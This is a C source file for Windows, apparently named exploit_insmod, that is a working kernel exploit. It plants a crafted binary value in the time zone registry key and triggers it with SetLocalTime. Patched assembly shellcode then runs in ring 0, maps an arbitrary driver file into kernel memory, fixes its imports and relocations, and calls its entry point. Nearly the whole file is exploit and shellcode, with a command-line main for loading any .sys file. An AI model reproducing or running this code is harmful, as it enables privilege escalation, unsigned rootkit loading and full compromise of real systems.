#include <stdio.h>
#include <errno.h>
#include <windows.h>
#include <winternl.h>

#include "winex.h"
#include "ntstatus.h"
#include "zwapi.h"
#include "kerndef.h"

#include "exploit_insmod.h"

#define TAG 'smon'

#pragma section(".fptr$XCA", long, write)
#pragma section(".fptr$XCU", long, write)
#pragma section(".fptr$XCZ", long, write)

__declspec(allocate(".fptr$XCA")) static char *__fptr_a[] = { 0 };
__declspec(allocate(".fptr$XCZ")) static char *__fptr_z[] = { 0 };

#define DEF_FPTR(x) \
    __declspec(allocate(".fptr$XCU")) static __fptr_ ## x __ ## x = (__fptr_ ## x)# x

DEF_FPTR(ExAllocatePoolWithTag);
DEF_FPTR(ExFreePoolWithTag);
DEF_FPTR(RtlInitAnsiString);
DEF_FPTR(RtlInitUnicodeString);
DEF_FPTR(RtlAnsiStringToUnicodeString);
DEF_FPTR(RtlFreeUnicodeString);
DEF_FPTR(MmGetSystemRoutineAddress);
DEF_FPTR(ZwOpenFile);
DEF_FPTR(ZwQueryInformationFile);
DEF_FPTR(ZwReadFile);
DEF_FPTR(KeDelayExecutionThread);
DEF_FPTR(ZwClose);
DEF_FPTR(memset);
DEF_FPTR(memcpy);

static int
relocate_to_kernel(unsigned char *base, void **kern_basep, void **entryp)
{
    IMAGE_DOS_HEADER *dos_hdr;
    IMAGE_NT_HEADERS *nt_hdr;
    IMAGE_SECTION_HEADER *sect_hdr;
    unsigned long image_size;
    unsigned long align_mask;
    unsigned char *kern_base;
    int nr_sect;
    int i;
    NTSTATUS st;

    dos_hdr = (IMAGE_DOS_HEADER *)base;
    nt_hdr = (IMAGE_NT_HEADERS *)(base + dos_hdr->e_lfanew);
    sect_hdr = (IMAGE_SECTION_HEADER *)(nt_hdr + 1);

    image_size = nt_hdr->OptionalHeader.SizeOfImage;
    nr_sect = (int)nt_hdr->FileHeader.NumberOfSections;
    align_mask = nt_hdr->OptionalHeader.SectionAlignment - 1;

    kern_base = __ExAllocatePoolWithTag(NonPagedPool, image_size, TAG);
    if (!kern_base)
        return -ENOMEM;
    __memset(kern_base, 0, image_size);

    /* 1. relocate section */
    for (i = 0; i < nr_sect; i++) {
        if (sect_hdr->VirtualAddress & align_mask)
            break;

        __memcpy(kern_base + sect_hdr->VirtualAddress,
                    base + sect_hdr->PointerToRawData,
                    sect_hdr->SizeOfRawData);
        sect_hdr++;
    }

    /* 2. set import address table (IAT) */
    do {
        IMAGE_IMPORT_DESCRIPTOR *imp_desc;
        unsigned long imp_size;

        imp_desc = (IMAGE_IMPORT_DESCRIPTOR *)(kern_base +
            nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        imp_size = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
        if (imp_size <= 0)
            break;

        for ( ; imp_desc->Name; imp_desc++) {
            IMAGE_THUNK_DATA *thunk;
            IMAGE_IMPORT_BY_NAME *imp_by_name;
            ANSI_STRING as;
            UNICODE_STRING us;
            void *fptr;

            thunk = (IMAGE_THUNK_DATA *)(kern_base + imp_desc->FirstThunk);
            for ( ; thunk->u1.Ordinal && !(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG); thunk++) {

                imp_by_name = (IMAGE_IMPORT_BY_NAME *)(kern_base + thunk->u1.Ordinal);

                __RtlInitAnsiString(&as, imp_by_name->Name);
                st = __RtlAnsiStringToUnicodeString(&us, &as, TRUE);
                if (!NT_SUCCESS(st))
                    continue;   /* FIXME   return error ? */

                fptr = __MmGetSystemRoutineAddress(&us);
                __RtlFreeUnicodeString(&us);
                if (fptr)
                    thunk->u1.Function = (ULONG)fptr;
                /* FIXME   return error ?
                else
                    return -ERANGE;
                */
            }
        }
    } while (0);

    /* 3. set relocate */
    do {
        IMAGE_BASE_RELOCATION *reloc;
        unsigned long reloc_size;
        unsigned long addr, offset;
        unsigned short *re;
        int nr_reloc;

        reloc = (IMAGE_BASE_RELOCATION *)(kern_base +
            nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        reloc_size = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (reloc_size <= 0)
            break;

        offset = kern_base - (unsigned char *)nt_hdr->OptionalHeader.ImageBase;

        while (reloc->SizeOfBlock) {
            nr_reloc = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(unsigned short);
            re = (unsigned short *)((char *)reloc + sizeof(IMAGE_BASE_RELOCATION));

            for (i = 0; i < nr_reloc; i++) {
                addr = (unsigned long)(re[i] & 0xfff);
                if ((re[i] >> 12) == IMAGE_REL_BASED_HIGHLOW)
                    *(unsigned long *)(kern_base + reloc->VirtualAddress + addr) += offset;
            }

            reloc = (IMAGE_BASE_RELOCATION *)((char *)reloc + reloc->SizeOfBlock);
        }
    } while (0);

    if (kern_basep)
        *kern_basep = kern_base;
    if (entryp)
        *entryp = kern_base + nt_hdr->OptionalHeader.AddressOfEntryPoint;

    return 0;
}

static NTSTATUS NTAPI
dummy_driver_entry(void *drvobj, UNICODE_STRING *regpath)
{
    return 0/*STATUS_SUCCESS*/;
}

static int __stdcall relocate_kmod(const wchar_t *kmod_path)
{
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us;
    IO_STATUS_BLOCK iosb;
    FILE_STANDARD_INFORMATION standard_info;
    HANDLE fd;
    unsigned char *buffer = NULL;
    unsigned int size;
    NTSTATUS st;
    int err;

    __RtlInitUnicodeString(&us, kmod_path);
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
    st = __ZwOpenFile(&fd, GENERIC_READ, &oa, &iosb,
                FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(st))
        return -EIO;

    do {
        void *kern_base;
        NTSTATUS (__stdcall *entry_point)(void *, UNICODE_STRING *);

        err = -ENFILE;
        st = __ZwQueryInformationFile(fd, &iosb, &standard_info,
                    sizeof(standard_info), FileStandardInformation);
        if (!NT_SUCCESS(st))
            break;
        size = standard_info.EndOfFile.LowPart;
        if (size == 0)
            break;

        err = -ENOMEM;
        buffer = __ExAllocatePoolWithTag(PagedPool, size, TAG);
        if (!buffer)
            break;

        err = -EFAULT;
        st = __ZwReadFile(fd, NULL, NULL, NULL, &iosb, buffer, size, NULL, NULL);
        if (!NT_SUCCESS(st))
            break;

        err = relocate_to_kernel(buffer, &kern_base, (void **)&entry_point);
        if (err < 0)
            break;

        /*st = IoCreateDriver(NULL, dummy_driver_entry);*/

        entry_point(NULL, NULL);

        err = 0;
    } while (0);

    if (buffer)
        __ExFreePoolWithTag(buffer, TAG);
    __ZwClose(fd);

    return err;
}

static void __declspec(naked) __payload(void)
{
    __asm {
            push    esp
            pushad
            pushfd
            push    12345678h
            call    relocate_kmod
            popfd
            popad
            pop     esp

            mov     ebp, esp
            add     ebp, 23456789h
            push    ebx
            mov     eax, [ebp + 4]
            call    find_retaddr
            pop     ebx
            cmp     eax, 0
            jz      do_delay
            push    eax
            xor     eax, eax    /* STATUS_SUCCESS */
            ret

        do_delay:
            call    delay

        /* function */
        find_retaddr:
            mov     ecx, eax
            add     ecx, [eax - 4]
            mov     ebx, ecx
            xor     ecx, ecx
        __loop:
            cmp     ecx, 500h
            jnb     __not_found
            mov     eax, [ebx]
            and     eax, 3456789ah
            cmp     eax, 456789abh
            jnz     __next
            mov     eax, ebx
            jmp     __ret
        __next:
            inc     ecx
            inc     ebx
            jmp     __loop
        __not_found:
            xor     eax, eax
        __ret:
            ret

        /* function */
        delay:
            sub     esp, 8
            mov     [esp], 0fb3b4c00h
            mov     [esp + 4], 0ffffffffh
        __loop_delay:
            lea     eax, [esp]
            push    eax
            push    0
            push    0
            call    __KeDelayExecutionThread
            jmp     __loop_delay
    }
}

static void __declspec(naked) __payload_end(void)
{
}


/********************************************************
 *                  run in ring 3                       *
 ********************************************************/

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;                 // Not filled in
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#define SystemModuleInformation 11

static void *dlopen_ntos_kmod(void **kern_base, size_t *kern_size)
{
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    unsigned long info_len;
    unsigned long retlen = 0;
    PRTL_PROCESS_MODULES info;
    PRTL_PROCESS_MODULE_INFORMATION kmod = 0;
    void *dl_base = NULL;

    info_len = 0x2000;

    while (1) {
        info = malloc(info_len);
        if (info) {
            memset(info, 0, info_len);
            st = ZwQuerySystemInformation(SystemModuleInformation, info, info_len, &retlen);
            if (st == STATUS_INFO_LENGTH_MISMATCH) {
                free(info);
                info_len *= 2;
                continue;
            }
        }

        break;
    }

    if (!NT_SUCCESS(st) || !retlen)
        return NULL;

    kmod = info->Modules;
    if (kern_base)
        *kern_base = kmod->ImageBase;
    if (kern_size)
        *kern_size = kmod->ImageSize;

    dl_base = LoadLibraryExA(kmod->FullPathName, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (!dl_base) {
        dl_base = LoadLibraryExA(kmod->FullPathName + kmod->OffsetToFileName,
                                                0, DONT_RESOLVE_DLL_REFERENCES);
    }

    free(info);
    return dl_base;
}

static int insert_kmod(const wchar_t *kmod_path)
{
    ULONG tmp;
    ULONG retlen = 0;
    void *dl_ntos;
    void *kern_ntos_base;
    unsigned char *sc;  /* shellcode */
    int sc_size;
    int i;
    int err;

    dl_ntos = dlopen_ntos_kmod(&kern_ntos_base, NULL);
    if (dl_ntos == NULL)
        return -EFAULT;

    sc = (unsigned char *)&__payload;
    sc_size = (unsigned char *)&__payload_end - sc;

    do {
        OSVERSIONINFOA verinfo = { 0 };
        unsigned int retaddr_up_offset;     /* 23456789 */
        unsigned long retaddr_mask;         /* 3456789a */
        unsigned long retaddr_value;        /* 456789ab */
        char **start, **end;

        err = -ENOSPC;
        if (!VirtualProtect(sc, sc_size, PAGE_EXECUTE_READWRITE, &tmp))
            break;

        verinfo.dwOSVersionInfoSize = sizeof(verinfo);
        GetVersionExA(&verinfo);
        if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 1) {
            retaddr_up_offset = 0x200;
            retaddr_mask = 0xffffff;
            retaddr_value = 0x353b66;
        } else {
            retaddr_up_offset = 0xfc;
            retaddr_mask = 0xffff;
            retaddr_value = 0x1b0;
        }

        /* do some replace */
        for (i = 0; i < sc_size; i++) {
            /* push  0x12345678, replace kmod_path */
            if (sc[i] == 0x68 && *(unsigned int *)&sc[i + 1] == 0x12345678)
                *(const wchar_t **)&sc[i + 1] = kmod_path;
            if (sc[i] == 0xc5 && *(unsigned int *)&sc[i + 1] == 0x23456789)
                *(unsigned int *)&sc[i + 1] = retaddr_up_offset;
            if (sc[i] == 0x25 && *(unsigned int *)&sc[i + 1] == 0x3456789a)
                *(unsigned long *)&sc[i + 1] = retaddr_mask;
            if (sc[i] == 0x3d && *(unsigned int *)&sc[i + 1] == 0x456789ab)
                *(unsigned long *)&sc[i + 1] = retaddr_value;
        }

        /* dlsym for kernel functions */
        start = __fptr_a;
        end = __fptr_z;
        while (start < end) {
            if (*start) {
                unsigned char *target;

                target = (unsigned char *)GetProcAddress(dl_ntos, *start);
                target += (char *)kern_ntos_base - (char *)dl_ntos;
                *(void **)start = (void *)target;
            }
            ++start;
        }

        err = 0;
    } while (0);

    return err;
}

int insmod(const wchar_t *kmod_path)
{
    struct {
        unsigned long v1;
        unsigned long v2;
        unsigned long v3;
        unsigned long v4;
        unsigned long v5;
    } exploit_buffer;
    OSVERSIONINFOA verinfo = { 0 };
    unsigned long sc;
    wchar_t buffer[MAX_PATH] = L"\\??\\";
    SYSTEMTIME time;
    HKEY key;
    LSTATUS st;
    int err;

    verinfo.dwOSVersionInfoSize = sizeof(verinfo);
    GetVersionExA(&verinfo);

    sc = (unsigned long)&__payload;
    exploit_buffer.v1 = 0;
    exploit_buffer.v2 = 0;
    /*exploit_buffer.v3 = sc;*/
    exploit_buffer.v4 = sc;
    exploit_buffer.v5 = sc;

    if (verinfo.dwMajorVersion >= 6) {
        exploit_buffer.v3 = 0;
    } else {
        exploit_buffer.v3 = sc;
    }

    wcsncat(buffer, kmod_path, MAX_PATH);
    if ((err = insert_kmod(buffer)) < 0)
        return err;

#define KEY_TIMEZONE "System\\CurrentControlSet\\Control\\TimeZoneInformation"
#define KEY_BIAS     "ActiveTimeBias"

    st = RegOpenKeyExA(HKEY_LOCAL_MACHINE, KEY_TIMEZONE,
                            0, KEY_SET_VALUE | DELETE, &key);
    if (st != ERROR_SUCCESS)
        return -ENODEV;

    RegDeleteKeyA(key, KEY_BIAS);

    err = -EPERM;
    st = RegSetValueExA(key, KEY_BIAS, 0, REG_BINARY,
                (const unsigned char *)&exploit_buffer, sizeof(exploit_buffer));
    if (st == ERROR_SUCCESS) {
        GetLocalTime(&time);
        SetLocalTime(&time);
        RegDeleteValueA(key, KEY_BIAS);

        err = 0;
    }

    RegCloseKey(key);

    return err;
}

#ifdef EXEC_MAIN

int main(int argc, char *argv[])
{
    wchar_t kmod[MAX_PATH];
    int err;

    if (argc < 2) {
        fprintf(stderr, "usage: %s sysfile\n", argv[0]);
        return EXIT_FAILURE;
    }

    mbstowcs(kmod, argv[1], MAX_PATH);

    if ((err = insmod(kmod)) >= 0) {
        fprintf(stdout, "success: %ws\n", kmod);
    } else {
        fprintf(stderr, "failed: %ws, error = %d\n", kmod, err);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

#endif /* EXEC_MAIN */
